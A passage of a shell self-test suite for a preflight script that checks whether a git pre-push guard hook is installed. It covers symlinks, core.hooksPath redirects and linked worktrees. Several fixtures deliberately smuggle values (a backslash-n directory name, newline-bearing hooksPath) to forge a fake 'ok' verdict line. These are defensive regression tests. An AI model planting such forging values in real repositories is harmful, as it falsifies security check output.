    case "$out" in
      "Runtime guard:"*"not the kit's"*) echo "FAIL: K11/U1 an unreadable KIT hook was MISLABELLED as a foreign hook ($out)"; fail=1;;
      "Runtime guard:"*) echo "PASS: K11/U1 an unreadable guard is NOT mislabelled as a foreign hook";;
      *) echo "FAIL: K11/U1 the guard section did not print at all on an unreadable hook ($out)"; fail=1;;
    esac
  fi

  # D1 (final fix-loop, finding X6) — a DANGLING SYMLINK at the destination is its own state, not
  # `absent`. `[ -f "$GUARD_HOOK" ]` FOLLOWS symlinks, so a dangling `.git/hooks/pre-push -> /elsewhere`
  # answered "absent" and the refusal then printed a `cp` that writes THROUGH the link and `chmod +x`s
  # the link's target. MEASURED (2026-07-21): pasting the emitted fix created an executable file at a
  # path outside the repository. The precondition is local write access to `.git/`, so this is hardening
  # rather than a live attack — but "absent" is the wrong ANSWER regardless, and `cp` is the wrong FIX.
  # THE NEGATIVE HALF IS LOAD-BEARING: `GUARD_STATE=absent` must NOT appear. Without it, an
  # implementation that merely reworded the MISS line while still classifying `absent` would pass —
  # and it is the STATE, not the wording, that selects the `cp` in the main-body refusal.
  d=$(k11_fx incepted dangling) || d=""
  [ -n "$d" ] || { echo "FAIL: K11/D1 fixture unbuildable (mktemp -d failed — disk full?) — its assertions are void"; fail=1; d=$K11_NOFX; }
  out=$(k11_run "$d") || out="<k11_run aborted>"; rm -rf "$d" 2>/dev/null || true
  case "$out" in
    *"GUARD_REFUSE=1 GUARD_STATE=absent"*)
      echo "FAIL: K11/D1 a DANGLING SYMLINK destination was classified 'absent' — the refusal's cp would write THROUGH the link to its target and chmod +x it ($out)"; fail=1 ;;
    *"DANGLING SYMLINK"*"GUARD_REFUSE=1 GUARD_STATE=dangling"*)
      echo "PASS: K11/D1 a dangling-symlink destination gets its own state, is reported as such, and still ARMS the refusal" ;;
    *) echo "FAIL: K11/D1 a dangling-symlink destination produced neither the 'absent' misclassification nor the dangling state ($out)"; fail=1 ;;
  esac

  # D2 — D1's sibling, and the SAME defect one path component up (security re-review, finding M-1). It
  # is not here: its claim is about the install COMMAND the main body emits, so it must run the whole
  # script through `k11_mp`, which is not defined until the MP block below. Grep `K11/D2`.

  # H1 — incepted, core.hooksPath set (husky/lefthook). That dir belongs to another tool, so the kit
  # neither installs into it nor passes judgment on it. Fail-safe: DISCLOSED SKIP, arming nothing.
  # The fixture has no pre-push hook in EITHER dir, so a check that ignored core.hooksPath would REFUSE
  # — cry-wolf on a legitimate brownfield repo. (Re-measured 2026-07-21: --git-path IS hooksPath-aware,
  # so without the skip the refusal now points at .husky/pre-push. That made the wolf louder, not
  # quieter: it names a file the kit has no business managing.)
  d=$(k11_fx incepted hookspath) || d=""
  [ -n "$d" ] || { echo "FAIL: K11/H1 fixture unbuildable (mktemp -d failed — disk full?) — its assertions are void"; fail=1; d=$K11_NOFX; }
  out=$(k11_run "$d") || out="<k11_run aborted>"; rm -rf "$d" 2>/dev/null || true
  case "$out" in "Runtime guard:"*"core.hooksPath is set to '.husky'"*"NOT judging .husky/pre-push"*) echo "PASS: K11/H1 a core.hooksPath repo gets a DISCLOSED SKIP naming the foreign hooks dir";; *) echo "FAIL: K11/H1 no disclosed core.hooksPath skip ($out)"; fail=1;; esac
  case "$out" in
    "Runtime guard:"*"MISS"*) echo "FAIL: K11/H1 cried wolf on a legitimate husky/lefthook brownfield repo ($out)"; fail=1;;
    "Runtime guard:"*"GUARD_REFUSE=0 GUARD_STATE="*) echo "PASS: K11/H1 the core.hooksPath skip arms NO refusal";;
    *) echo "FAIL: K11/H1 the guard section did not print on a core.hooksPath tree ($out)"; fail=1;;
  esac

  # H2 — incepted, core.hooksPath set to the NO-OP value .git/hooks. Some tooling writes exactly that;
  # it redirects nothing, so git runs the very file this check judges. Treating "the key is set" as "the
  # key redirects" silences the check on precisely the unguarded state K11 exists to catch — a
  # fail-OPEN hidden inside a fail-safe. This fixture installs NO hook, so "judged normally" and
  # "skipped" produce opposite verdicts (MISS+armed vs a skip line and nothing armed): the assertion
  # cannot be satisfied by the pre-M2 behaviour. Kill decision: reverting the guard to a bare
  # `if [ -n "$_hp" ]` must turn these two RED while H1 stays green.
  d=$(k11_fx incepted hookspath-noop) || d=""
  [ -n "$d" ] || { echo "FAIL: K11/H2 fixture unbuildable (mktemp -d failed — disk full?) — its assertions are void"; fail=1; d=$K11_NOFX; }
  out=$(k11_run "$d") || out="<k11_run aborted>"; rm -rf "$d" 2>/dev/null || true
  case "$out" in
    *"skip pre-push guard"*) echo "FAIL: K11/H2 a NO-OP core.hooksPath=.git/hooks was treated as a redirect and skipped — silent on an unguarded tree ($out)"; fail=1;;
    "Runtime guard:"*"MISS pre-push guard"*"not installed at"*) echo "PASS: K11/H2 a no-op core.hooksPath=.git/hooks is judged normally, not skipped";;
    *) echo "FAIL: K11/H2 a no-op core.hooksPath tree produced neither a skip nor a MISS ($out)"; fail=1;;
  esac
  case "$out" in *"GUARD_REFUSE=1 GUARD_STATE=absent"*) echo "PASS: K11/H2 a no-op core.hooksPath still ARMS the refusal for the absent guard";; *) echo "FAIL: K11/H2 a no-op core.hooksPath swallowed the absent-guard refusal ($out)"; fail=1;; esac

  # H3 — the SAME relative core.hooksPath=.git/hooks, judged from inside a LINKED WORKTREE. H2 alone
  # could not see this: a relative value was resolved against `--show-toplevel`, which in a linked
  # worktree is the WORKTREE root, where `.git` is a FILE — so `<wt>/.git/hooks` does not exist, the
  # resolution failed, and the UNRESOLVABLE => skip rule fired. Same config, opposite verdict:
  #   MAIN tree: MISS … / GUARD_REFUSE=1 absent      LINKED worktree: skip … / GUARD_REFUSE=0
  # i.e. a fail-OPEN nested inside the fail-safe, in the lane W1/W2 already carry two legs for. This
  # leg pins the two trees to the SAME verdict. Kill decision: removing the main-worktree retry in
  # guard_hookspath_is_noop must turn it RED while H1/H2 stay green (measured: it does, 2 FAILs, both
  # H3, 32 other legs untouched).
  # FALSE-POSITIVE DIRECTION MEASURED TOO, since this fix makes the check judge MORE: a real
  # `hooksPath = .husky` still SKIPS from a linked worktree in both shapes — `.husky` checked out in the
  # worktree, and `.husky` present only in the main tree. It cannot do otherwise by construction: the
  # retry can only reach the default hooks dir for a value that NAMES it (`<gitdirname>/hooks`), which
  # names no other tool. H1 remains the main-tree lock for that lane.
  d=$(k11_fx incepted hookspath-noop) || d=""
  [ -n "$d" ] || { echo "FAIL: K11/H3 fixture unbuildable (mktemp -d failed — disk full?) — its assertions are void"; fail=1; d=$K11_NOFX; }
  _h3wt="$d-wt"
  ( cd "$d" \
    && GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_SYSTEM=/dev/null git add -A \
    && GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_SYSTEM=/dev/null \
       git -c commit.gpgsign=false -c user.email=k11@fixture.invalid -c user.name=k11 commit -qm "k11 hooksPath worktree fixture" \
    && GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_SYSTEM=/dev/null git worktree add -q "$_h3wt" -b k11h3 ) >/dev/null 2>&1 || true
  if [ -d "$_h3wt" ]; then
    out=$(k11_run "$_h3wt") || out="<k11_run aborted>"
    case "$out" in
      *"skip pre-push guard"*) echo "FAIL: K11/H3 from a LINKED WORKTREE the relative core.hooksPath=.git/hooks took the disclosed skip — the same tree that is judged from the main worktree goes silent here (fail-open) ($out)"; fail=1;;
      "Runtime guard:"*"MISS pre-push guard"*"not installed at"*) echo "PASS: K11/H3 a relative core.hooksPath=.git/hooks is judged normally from a LINKED WORKTREE too, not skipped";;
      *) echo "FAIL: K11/H3 a core.hooksPath worktree produced neither a skip nor a MISS ($out)"; fail=1;;
    esac
    case "$out" in *"GUARD_REFUSE=1 GUARD_STATE=absent"*) echo "PASS: K11/H3 the linked worktree ARMS the refusal, matching the main tree's verdict on the identical config";; *) echo "FAIL: K11/H3 the linked worktree did not arm the refusal that the SAME config arms from the main tree ($out)"; fail=1;; esac
    ( cd "$d" && GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_SYSTEM=/dev/null \
                 git worktree remove --force "$_h3wt" ) >/dev/null 2>&1 || true
  else
    echo "FAIL: K11/H3 could not build the core.hooksPath linked-worktree fixture (git worktree add failed) — the lane is left unasserted"; fail=1
  fi
  rm -rf "$d" "$_h3wt" 2>/dev/null || true

  # H6 (HOOK-INSTALL-RECURS-PER-SLICE, review round 1) — core.hooksPath naming the repo's OWN TRACKED
  # hooks/ dir: the kit's second documented install, not a foreign redirect. Before the tracked-dir
  # predicate this printed the deferential skip — "this repo manages its own hooks. The kit is NOT
  # judging hooks/pre-push. Install the guard there yourself" — about a file that IS the kit's guard,
  # on the very install brownfield.md §2 step 5 now recommends, while guard-wired.sh and
  # inception-done.sh both certify it. Two fixtures, because the pair is what makes the leg
  # discriminating rather than decorative:
  #   present -> the guard IS live: judged normally, `ok`, nothing armed (the skip would have printed
  #              the "not judging" line instead)
  #   absent  -> nothing runs on push: MISS + refusal ARMED (the skip would have been SILENT — the
  #              fail-open the disclosed skip becomes the moment the recommended install is taken)
  # Kill decision: reverting the `&& ! guard_hookspath_is_tracked_dir` conjunct must turn both halves
  # RED while H1 (a genuine .husky redirect) stays green.
  d=$(k11_fx incepted hookspath-tracked) || d=""
  [ -n "$d" ] || { echo "FAIL: K11/H6 fixture unbuildable (mktemp -d failed — disk full?) — its assertions are void"; fail=1; d=$K11_NOFX; }
  out=$(k11_run "$d") || out="<k11_run aborted>"; rm -rf "$d" 2>/dev/null || true
  case "$out" in
    *"skip pre-push guard"*) echo "FAIL: K11/H6 core.hooksPath naming the repo's OWN tracked hooks/ was treated as a foreign redirect and skipped — the kit refuses to judge its own live guard ($out)"; fail=1;;
    "Runtime guard:"*"ok   pre-push guard installed and executable"*) echo "PASS: K11/H6 the tracked-hooks install is judged normally — the live guard is seen, not deferred to";;
    *) echo "FAIL: K11/H6 a tracked-hooks tree produced neither a skip nor an ok verdict ($out)"; fail=1;;
  esac
  d=$(k11_fx incepted hookspath-tracked-none) || d=""
  [ -n "$d" ] || { echo "FAIL: K11/H6 sibling fixture unbuildable (mktemp -d failed — disk full?) — its assertions are void"; fail=1; d=$K11_NOFX; }
  out=$(k11_run "$d") || out="<k11_run aborted>"; rm -rf "$d" 2>/dev/null || true
  case "$out" in *"GUARD_REFUSE=1 GUARD_STATE=absent"*) echo "PASS: K11/H6 with the tracked hook GONE the same setting ARMS the refusal, instead of going silent";; *) echo "FAIL: K11/H6 a tracked-hooks tree with NO hook stayed silent — the skip is a fail-open on the recommended install ($out)"; fail=1;; esac

  # H4 (final fix-loop, finding Y1) — the NO-OP core.hooksPath when the DEFAULT HOOKS DIR DOES NOT EXIST.
  # H2 could not see this: its fixture has a `.git/hooks` (git init creates one), and the old resolution
  # required BOTH sides to exist. A repo created with an empty `--template` has no `.git/hooks`, so
  # `_hp_def` came back empty, guard_hookspath_is_noop answered "not a no-op", and the caller took the
  # DISCLOSED SKIP on a genuinely unguarded incepted tree — fail-open, and the exact inverse of design
  # §8 ("a value naming the repo's own default hooks dir is NOT skipped — it is judged normally").
  # SAME ASSERTION SHAPE AS H2 ON PURPOSE: the two fixtures differ in exactly one fact (does .git/hooks
  # exist), so a divergence between them is the finding and nothing else.
  # Kill decision: reverting either side of guard_hookspath_is_noop to the existence-DEPENDENT
  # `cd … && pwd -P` must turn this RED while H1/H2/H3 stay green.
  d=$(k11_fx incepted hookspath-noop-nodir) || d=""
  [ -n "$d" ] || { echo "FAIL: K11/H4 fixture unbuildable (mktemp -d failed — disk full?) — its assertions are void"; fail=1; d=$K11_NOFX; }
  out=$(k11_run "$d") || out="<k11_run aborted>"; rm -rf "$d" 2>/dev/null || true
  case "$out" in
    *"skip pre-push guard"*) echo "FAIL: K11/H4 a no-op core.hooksPath=.git/hooks was SKIPPED because the default hooks dir does not exist — silent on an unguarded incepted tree, the inverse of design §8 ($out)"; fail=1;;
    "Runtime guard:"*"MISS pre-push guard"*) echo "PASS: K11/H4 a no-op core.hooksPath is judged normally even when .git/hooks does not exist (both sides resolve existence-independently)";;
    *) echo "FAIL: K11/H4 the fixture produced neither a skip nor a MISS ($out)"; fail=1;;
  esac
  case "$out" in *"GUARD_REFUSE=1 GUARD_STATE=absent"*) echo "PASS: K11/H4 that judgment ARMS the refusal, so the unguarded tree is not merely mentioned";; *) echo "FAIL: K11/H4 the absent guard was reported but no refusal was armed ($out)"; fail=1;; esac

  # H5 (final fix-loop, finding X4) — core.hooksPath set OUTSIDE the repository. `git config --get`
  # reads local, global AND system scope, but the skip's wording was "this repo manages its own hooks"
  # — a claim about the REPO made from a value that may be one line in `~/.gitconfig` (common with
  # husky, lefthook and corporate setups). MEASURED (2026-07-21): a global-only core.hooksPath made this
  # check silent and green in an unguarded incepted repo, i.e. on EVERY repo on that machine at once.
  # This leg is the ONLY one that may unset the hermetic GIT_CONFIG_GLOBAL — deliberately, because the
  # global scope IS the thing under test. It points at a fixture file, never at the developer's real
  # ~/.gitconfig, so the run stays hermetic in every other respect.
  # THE NEGATIVE HALF IS LOAD-BEARING TWICE OVER: the reassuring per-repo wording must NOT appear (that
  # was the lie), and the section must not go silent either (silence was the effect).
  d=$(k11_fx incepted none) || d=""
  [ -n "$d" ] || { echo "FAIL: K11/H5 fixture unbuildable (mktemp -d failed — disk full?) — its assertions are void"; fail=1; d=$K11_NOFX; }
  printf '[core]\n\thooksPath = %s\n' "$d/elsewhere-hooks" > "$d/k11-global-gitconfig" 2>/dev/null || true
  mkdir -p "$d/elsewhere-hooks" 2>/dev/null || true
  out=$( cd "$d" 2>/dev/null && { GIT_CONFIG_GLOBAL="$d/k11-global-gitconfig" GIT_CONFIG_SYSTEM=/dev/null check_guard_installed || true
                                  printf 'GUARD_REFUSE=%s GUARD_STATE=%s\n' "${GUARD_REFUSE-unset}" "${GUARD_STATE-unset}"; } ) 2>&1 || out="<k11 H5 aborted>"
  rm -rf "$d" 2>/dev/null || true
  case "$out" in
    *"this repo manages its own hooks"*)
      echo "FAIL: K11/H5 a core.hooksPath that came from a GLOBAL config was reported as 'this repo manages its own hooks' — nothing in this repository asked for it, and the check went green on an unguarded tree ($out)"; fail=1 ;;
    "Runtime guard:"*"NOT IN FORCE"*"OUTSIDE this repository"*)
      echo "PASS: K11/H5 a non-local core.hooksPath is reported as a scope problem — the kit's guard is stated NOT IN FORCE, without the reassuring per-repo wording" ;;
    *) echo "FAIL: K11/H5 a global core.hooksPath produced neither the false per-repo reassurance nor the scope warning ($out)"; fail=1 ;;
  esac

  # E1 — the KILL DECISION for the printf-not-echo fix in the skip stanza. Without it that security fix
  # was assertion-free: reverting both `printf '%s\n'` calls to `echo` and running under a shell whose
  # echo honours backslash escapes forges a line into a security check's verdict (measured: 6 output
  # lines instead of 4) and every other leg stays green — exactly the "a green attests the test RAN,
  # never that the claim is true" hole this file's own doctrine forbids.
  # SHAPE, NOT WORDING: the stanza is pinned by LINE COUNT (header + 2 stanza lines + the k11_run
  # trailer = 4) and by the absence of the forged continuation line, so it survives a reword of the skip
  # text but not an injected line. The count is anchored to the skip having actually printed — a bare
  # "4 lines" is also what several broken implementations emit.
  # HONEST CEILING: whether the mutant dies is SHELL-DEPENDENT, because the bug is. `echo` expanding
  # `\n` is permitted-but-not-required by POSIX; it expands under dash (which IS /bin/sh on the
  # ubuntu-latest runner that executes ci.yml's `sh scripts/preflight.sh --selftest`) and under this
  # host's /bin/sh, and does not under a bash built without xpg_echo. The ASSERTION is shell-independent
  # and always runs; only the mutation kill needs a forging echo.
  d=$(k11_fx incepted hookspath-escape) || d=""
  [ -n "$d" ] || { echo "FAIL: K11/E1 fixture unbuildable (mktemp -d failed — disk full?) — its assertions are void"; fail=1; d=$K11_NOFX; }
  out=$(k11_run "$d") || out="<k11_run aborted>"; rm -rf "$d" 2>/dev/null || true
  _e1n=$(printf '%s\n' "$out" | wc -l | tr -d ' ')
  _e1f=$(printf '%s\n' "$out" | grep -c "^b'") || _e1f=0
  case "$out" in
    "Runtime guard:"*"skip pre-push guard"*)
      if [ "$_e1n" = 4 ]; then
        echo "PASS: K11/E1 a core.hooksPath carrying a literal backslash-n prints the skip stanza VERBATIM — 4 output lines, no line synthesised from the config value"
      else
        echo "FAIL: K11/E1 a hostile core.hooksPath forged extra lines into the guard's verdict ($_e1n output lines, expected 4) ($out)"; fail=1
      fi ;;
    *) echo "FAIL: K11/E1 the hostile core.hooksPath value did not produce the disclosed skip stanza at all ($out)"; fail=1 ;;
  esac
  if [ "$_e1f" = 0 ]; then
    echo "PASS: K11/E1 no output line was forged out of the config value (nothing begins with the injected continuation)"
  else
    echo "FAIL: K11/E1 $_e1f output line(s) were SYNTHESISED from the core.hooksPath value — the verdict is attacker-shapeable ($out)"; fail=1
  fi

  # E2/E3/E4 (final fix-loop, finding X3) — THE E1 FAMILY EXTENDED TO THE AXIS IT COULD NOT REACH.
  # E1's only fixture axis is the core.hooksPath VALUE. Both routes the security review reproduced are
  # PATH-derived, and E1 cannot see either of them by construction — which is why a `printf`-rule the
  # file had already written down survived unapplied at the one `echo` that carried a variable.

  # E2 — the PATH axis of E1's own bug: the repo root's NAME carries a literal backslash-n, which the
  # `echo` at the MISS line expanded into a forged `ok   pre-push guard installed and executable`
  # verdict. MEASURED under /bin/dash — which IS /bin/sh on the ubuntu-latest runner that runs this in
  # CI — before the fix. The forged text is chosen to be this check's OWN happy-path verdict, so a
  # regression does not merely add noise, it inverts the answer.
  # SHELL-DEPENDENT KILL, SHELL-INDEPENDENT ASSERTION, exactly as E1 records for its own mutant.
  d=$(k11_fx incepted none 'e\nok   pre-push guard installed and executable\n') || d=""
  [ -n "$d" ] || { echo "FAIL: K11/E2 fixture unbuildable (mktemp -d / rename failed) — its assertions are void"; fail=1; d=$K11_NOFX; }
  out=$(k11_run "$d") || out="<k11_run aborted>"; rm -rf "$d" 2>/dev/null || true
  _e2f=$(printf '%s\n' "$out" | grep -c '^ok   pre-push guard installed') || _e2f=0
  case "$out" in
    "Runtime guard:"*"MISS pre-push guard"*)
      if [ "$_e2f" = 0 ]; then
        echo "PASS: K11/E2 a repo path containing a literal backslash-n cannot forge a verdict line — the MISS prints it verbatim (printf, not echo)"
      else
        echo "FAIL: K11/E2 $_e2f line(s) reading 'ok   pre-push guard installed…' were FORGED out of the repository's own directory name — the verdict is path-shapeable ($out)"; fail=1
      fi ;;
    *) echo "FAIL: K11/E2 the backslash-n-named fixture did not reach the MISS line at all ($out)"; fail=1 ;;
  esac

  # E3 — E1's DISCLOSED RESIDUAL, closed. The T2 stanza recorded that a SINGLE-backslash config value
  # ("a\nb") is un-escaped by git into a REAL newline, which `printf '%s\n'` passes straight through,
  # and called it unfixable from there. It is fixable — just not by printf: rejecting control characters
  # before printing is what closes it, and it is the same parse-time rejection CP-7 Slice 2 used against
  # `--intent-owner` injection. FAIL-CLOSED, not silent: the check refuses, so an attacker cannot switch
  # it off by choosing a value.
  d=$(k11_fx incepted hookspath-nl) || d=""
  [ -n "$d" ] || { echo "FAIL: K11/E3 fixture unbuildable (mktemp -d failed — disk full?) — its assertions are void"; fail=1; d=$K11_NOFX; }
  out=$(k11_run "$d") || out="<k11_run aborted>"; rm -rf "$d" 2>/dev/null || true
  _e3n=$(printf '%s\n' "$out" | wc -l | tr -d ' ')
  case "$out" in
    *"skip pre-push guard"*)
      echo "FAIL: K11/E3 a core.hooksPath containing a REAL newline was echoed into a disclosed skip — the value spans lines and the verdict is attacker-shapeable ($out)"; fail=1 ;;
    "Runtime guard:"*"CONTROL CHARACTER"*"GUARD_REFUSE=1 GUARD_STATE=hostile-path"*)
      if [ "$_e3n" = 3 ]; then
        echo "PASS: K11/E3 a core.hooksPath carrying a REAL newline is REFUSED without being echoed — 3 output lines, none synthesised (E1's disclosed residual is closed, not inherited)"
      else
        echo "FAIL: K11/E3 the control-character refusal fired but the output is $_e3n lines, not 3 — something still echoed the value ($out)"; fail=1
      fi ;;
    *) echo "FAIL: K11/E3 a newline-bearing core.hooksPath produced neither the skip nor the control-character refusal ($out)"; fail=1 ;;
  esac

  # E4 completes this family but is a WHOLE-SCRIPT leg (it needs the main-body refusal, not just
  # check_guard_installed), so it lives below with MP10/MP11 — `k11_mp` is not defined until then.
  # Measured while writing it: calling k11_mp from here yields "command not found", the leg's own
  # `|| out="<k11_mp aborted>"` sentinel, and a loud FAIL. The sentinel worked; the placement is the fix.

  # W3 (design §4.5) — the reported path must be ABSOLUTE. `git rev-parse --git-path` answers relative
  # to the CWD (measured, git 2.48.1: from <repo>/a/b it yields ../../.git/hooks/pre-push), and the
  # refusal prints that value inside a `cp` command a human is told to PASTE. Pasted from anywhere but
  # preflight's own cwd, a relative path is a broken command — and no other leg can see this, because
  # every other leg runs from a fixture ROOT where the relative form is already correct-looking. This
  # leg runs the check from a SUBDIRECTORY and pins the exact physical path, so absoluteness AND
  # correctness are asserted together. Kill decision: deleting the absolutizing `case` must turn it RED.
  #
  # NOTE TO WHOEVER WRITES guard_tree_class: this leg ALSO requires that predicate to anchor its file
  # tests at the repo TOP-LEVEL (`git rev-parse --show-toplevel`), not at the cwd. Measured while
  # building this leg: a cwd-relative predicate such as `[ -f ENGINEERING-PRINCIPLES.md ]` returns
  # kit-source from every subdirectory, so the whole check goes SILENT there — the same fail-open class
  # as the inverted-fixture defect, reached by a different door. W3 is the only leg that can see it,
  # because every other leg runs from a fixture root where a cwd-relative test happens to be right.
  d=$(k11_fx incepted none) || d=""
  [ -n "$d" ] || { echo "FAIL: K11/W3 fixture unbuildable (mktemp -d failed — disk full?) — its assertions are void"; fail=1; d=$K11_NOFX; }
  _sp=$( CDPATH='' cd -- "$d" && pwd -P ) || _sp="$d"
  mkdir -p "$d/src/deep/nested" || true   # `|| true`: on the unbuildable-fixture path this mkdir MUST
                                          # fail (ENOTDIR under the sentinel), and an unguarded failure
                                          # under `set -e` would kill the run instead of the leg
  out=$(k11_run "$d/src/deep/nested") || out="<k11_run aborted>"
  rm -rf "$d" 2>/dev/null || true
  # THE DOUBLE QUOTES AROUND $_sp IN THE PATTERN BELOW ARE LOAD-BEARING — do not "simplify" them away.
  # A review round asked for them on the theory that a glob metacharacter in the mktemp path would be
  # honoured and a `*` would make this assertion vacuously true. RE-MEASURED (2026-07-21) in /bin/sh,
  # dash and bash, with _sp='/tmp/k11*evil' against an output naming a DIFFERENT path: an expansion
  # inside double quotes in a case pattern is LITERAL and does not match, while the same expansion
  # UNQUOTED does match and is vacuous. So the quoted form here (and at W2 below) is already sound and
  # needed no change — but only while the quotes stay. Same result for the `${out#*"…"}` idiom.
  case "$out" in *"not installed at $_sp/.git/hooks/pre-push"*) echo "PASS: K11/W3 run from a subdirectory, the reported hook path is ABSOLUTE and correct (paste-able per §4.5)";; *) echo "FAIL: K11/W3 from a subdirectory the reported path is not the absolute $_sp/.git/hooks/pre-push — a pasted 'cp … \$GUARD_HOOK' would be broken ($out)"; fail=1;; esac
  case "$out" in *"GUARD_REFUSE=1 GUARD_STATE=absent"*) echo "PASS: K11/W3 absolutizing the path does not break detection from a subdirectory";; *) echo "FAIL: K11/W3 the absent guard was not detected from a subdirectory ($out)"; fail=1;; esac

  # W1/W2 (design §4.4) — LINKED WORKTREE. §4.4 requires the `--git-path` form and NOT a hardcoded
  # .git/hooks/pre-push, but nothing asserted it: at review, substituting the hardcoded form left every
  # other leg green. Under `git worktree add` the two forms DISAGREE (measured, git 2.48.1): --git-path
  # yields the SHARED <main>/.git/hooks/pre-push because hooks live in the common dir, while the linked
  # worktree's own .git is a FILE — so the hardcoded form finds nothing and reports a FALSE MISS on a
  # correctly guarded tree. W1 kills the hardcoded form; W2 pins the path actually reported.
  d=$(k11_fx incepted installed) || d=""
  [ -n "$d" ] || { echo "FAIL: K11/W1 fixture unbuildable (mktemp -d failed — disk full?) — its assertions are void"; fail=1; d=$K11_NOFX; }
  _dp=$( CDPATH='' cd -- "$d" && pwd -P ) || _dp="$d"   # git records the PHYSICAL path in the worktree link
  _wt="$d-wt"
  ( cd "$d" \
    && GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_SYSTEM=/dev/null git add -A \
    && GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_SYSTEM=/dev/null \
       git -c commit.gpgsign=false -c user.email=k11@fixture.invalid -c user.name=k11 commit -qm "k11 worktree fixture" \
    && GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_SYSTEM=/dev/null git worktree add -q "$_wt" -b k11wt ) >/dev/null 2>&1 || true
  if [ -d "$_wt" ]; then
    out=$(k11_run "$_wt") || out="<k11_run aborted>"
    case "$out" in "Runtime guard:"*"ok   pre-push guard installed"*"GUARD_REFUSE=0 GUARD_STATE="*) echo "PASS: K11/W1 from inside a LINKED WORKTREE the shared installed guard is still found (the --git-path form; the hardcoded .git/hooks/ form would false-MISS here)";; *) echo "FAIL: K11/W1 linked worktree misclassified an installed shared guard — the hooks path is not being resolved with --git-path ($out)"; fail=1;; esac
    rm -f "$_dp/.git/hooks/pre-push"
    out=$(k11_run "$_wt") || out="<k11_run aborted>"
    # $_dp is double-quoted inside the pattern for the reason measured at W3 above — keep it that way.
    case "$out" in *"MISS pre-push guard"*"$_dp/.git/hooks/pre-push"*) echo "PASS: K11/W2 from the worktree the MISS names the SHARED main-tree hook path, not a worktree-local one";; *) echo "FAIL: K11/W2 the worktree MISS did not name the shared $_dp/.git/hooks/pre-push ($out)"; fail=1;; esac
    case "$out" in *"GUARD_REFUSE=1 GUARD_STATE=absent"*) echo "PASS: K11/W2 an absent shared guard ARMS the refusal from inside a linked worktree";; *) echo "FAIL: K11/W2 an absent shared guard did not arm the refusal from the worktree ($out)"; fail=1;; esac
    ( cd "$d" && GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_SYSTEM=/dev/null \
                 git worktree remove --force "$_wt" ) >/dev/null 2>&1 || true
  else
    echo "FAIL: K11/W1 could not build the linked-worktree fixture (git worktree add failed) — design §4.4 is left unasserted"; fail=1
  fi
  rm -rf "$d" "$_wt" 2>/dev/null || true

  # A1 — ANTI-WOLF. A pre-inception kit-source tree has no guard obligation, so the check must be
  # entirely SILENT there: no section header, nothing armed. This leg also exercises k11_fx's kit-source
  # arm, which no other leg reaches — a typo there would otherwise ship unnoticed (S2 checks its shape;
  # this checks the behaviour). Honest ceiling: an anti-wolf assertion is satisfied by silence, so it was
  # VACUOUSLY green while guard_tree_class's body was `:` — the T1 slice's deliberate red state, ended
  # when the owner wrote the predicate (T2 fix-loop, finding J6: the old wording was in the present
  # tense and had stopped being true). It is now load-bearing, and it is the only thing standing between
  # a too-broad predicate and a gate the owner learns to ignore (doctor.sh:18). Design §6 records why a
  # mutation sweep can never find this.
  d=$(k11_fx kit-source none) || d=""
  [ -n "$d" ] || { echo "FAIL: K11/A1 fixture unbuildable (mktemp -d failed — disk full?) — its assertions are void"; fail=1; d=$K11_NOFX; }
  out=$(k11_run "$d") || out="<k11_run aborted>"; rm -rf "$d" 2>/dev/null || true
  case "$out" in *"Runtime guard:"*) echo "FAIL: K11/A1 the check CRIED WOLF on a pre-inception kit-source tree ($out)"; fail=1;; *) echo "PASS: K11/A1 a kit-source tree gets no guard section at all (anti-wolf)";; esac
  case "$out" in *"GUARD_REFUSE=0 GUARD_STATE="*) echo "PASS: K11/A1 a kit-source tree arms NO refusal";; *) echo "FAIL: K11/A1 a kit-source tree armed a refusal ($out)"; fail=1;; esac

  # — MP1..MP5 (T2): THE WIRING, not the function ————————————————————————————————————————
  # Every leg above calls check_guard_installed DIRECTLY, so not one of them can see whether a real run
  # ever REACHES it — and until T2 it did not. Measured on the T1 tree (2026-07-21): an incepted-shaped
  # fixture with no installed hook ran the whole script and printed "All prerequisites present.", exit 0.
  # The detection was correct, complete, locked by 34 assertions, and DEAD. That is this file's own
  # recurring failure — "a defined-but-unacted-on check is decorative (the exact class that shipped twice
  # in this repo)" — restated one function over.
  #
  # So every MP leg drives the WHOLE SCRIPT (`sh "$K11_ROOT/scripts/preflight.sh"` with cwd = a fixture).
  # A direct call cannot see a missing call site, and it cannot see the refusal's `exit 1` either.
  #
  # EXIT CODES ARE ASSERTED WITH A DISCRIMINATING MESSAGE, never bare: preflight exits 1 for a missing
  # required tool and 2 for bad usage, so `rc = 1` alone passes for the wrong reason (the --raw scar).
  # MP3/MP4 invert that problem — they assert exit 0, which folds in the AMBIENT environment (a missing
  # jq reddens them for a reason that has nothing to do with this check; a false-RED generator is the
  # same defect class as a vacuous green, inverted). They therefore assert the rc DIFFERENTIALLY against
  # a baseline run in a directory that has no guard obligation at all, and assert the anti-wolf claim
  # itself — the absence of a `Runtime guard:` section — absolutely.
  k11_mp() {  # <cwd> [preflight args…] -> the whole script's stdout+stderr, plus an `MP_RC=<rc>` trailer
    # The rc is captured with `|| _mprc=$?` rather than read after the fact: `set -e` is in force in this
    # shell and inherited by the subshell, so an un-`||`'d non-zero exit — which is the WHOLE POINT of
    # MP1/MP2/MP5 — would kill the subshell before the trailer, and the leg would read "no rc" instead of
    # "rc 1". Hermetic prefixes for the same reason k11_run carries them (a developer's global
    # core.hooksPath sends every fixture down the disclosed skip).
    ( cd "$1" 2>/dev/null || { printf 'MP_RC=cd-failed\n'; exit 0; }
      shift
      _mprc=0
      GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_SYSTEM=/dev/null \
        PREFLIGHT_GH_CMD='false' ACTIONLINT_VALID_CMD='__skip__' \
        sh "$K11_ROOT/scripts/preflight.sh" "$@" 2>&1 || _mprc=$?
      printf 'MP_RC=%s\n' "$_mprc" ) 2>&1
  }

  # MP1 — incepted + guard ABSENT, whole script from the fixture ROOT. The fresh-clone case the slice
  # exists for, driven end to end. Asserts the three things a direct call cannot: the call site is
  # reached, the refusal fires, and it exits 1 carrying a paste-able install command whose BOTH paths
